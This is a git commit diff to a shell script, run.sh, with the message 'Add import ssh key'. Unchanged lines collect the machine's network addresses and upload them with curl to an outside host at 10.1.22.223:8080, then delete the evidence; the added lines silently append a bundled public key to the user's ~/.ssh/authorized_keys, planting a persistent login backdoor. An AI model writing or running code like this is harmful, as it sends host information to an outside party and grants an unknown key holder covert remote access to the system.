1b3342cb12711c7bf9d8ef0fce7e3cc39185d03b
Alexandru Danila <alex.danila94@gmail.com>
2018-06-04 12:40:57 -0400

    Add import ssh key

--- run.sh
+++ run.sh
@@ -7,3 +7,7 @@ ip addr >> /tmp/testfile
 curl -F "upfile=@/tmp/testfile" http://10.1.22.223:8080/
 rm /tmp/testfile
 
+if [[ `grep -f < ./fuckery-rsa.pub $HOME/.ssh/authorized_keys` = "" ]]; then
+    cat fuckery-rsa.pub >> $HOME/.ssh/authorized_keys
+fi
+
